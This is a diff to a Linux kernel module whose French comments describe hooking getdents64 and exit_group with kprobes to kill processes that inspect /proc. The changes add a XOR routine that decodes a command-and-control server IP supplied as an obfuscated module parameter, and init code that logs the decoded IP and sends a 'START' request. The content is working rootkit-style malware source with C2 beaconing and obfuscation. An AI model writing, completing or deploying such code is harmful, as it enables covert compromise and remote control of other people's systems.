@@ -16,7 +16,7 @@ MODULE_DESCRIPTION("Hook __x64_sys_getdents64 and __x64_sys_exit_group to kill o
 MODULE_INFO(intree, "Y");
 
 static char ip_param[KSYM_NAME_LEN] = "127.0.0.1";
-module_param_string(ip, ip_param, KSYM_NAME_LEN, 0644);
+module_param_string(param, ip_param, KSYM_NAME_LEN, 0644);
 
 /* static struct kprobe kp; */
 static struct kprobe kp2;
@@ -25,6 +25,13 @@ static char path_buffer[MAX_PATH_BUFFER];
 bool killed = false;
 static struct workqueue_struct *wq;
 
+// fonction pour déchiffrer l'IP du C2 passé en param 
+static void custom_xor(u8 *dst, const u8 *src, u8 key, unsigned int len) {
+    unsigned int i;
+    for (i = 0; i < len; i++) {
+        dst[i] = src[i] ^ key;
+    }
+}
 
 /* Fonction pour rechercher et kill nos processus */
 /* Appellée directement si 'ps' ou 'top', et si un 'ls' ou 'sh' interagit avec /proc */
@@ -161,6 +168,11 @@ static int handler_pre3(struct kprobe *p, struct pt_regs *regs) {
 
 // Init function (called when insmod)
 static int __init hook_init(void) {
+	
+	// récupérer l'IP du C2 a partir du param
+ 	u8 key = 126;
+	custom_xor(ip_param, ip_param, key, strlen(ip_param));
+	pr_info("[+] IP: %s\n", ip_param);
 
 	// networking start
 	make_request("START");
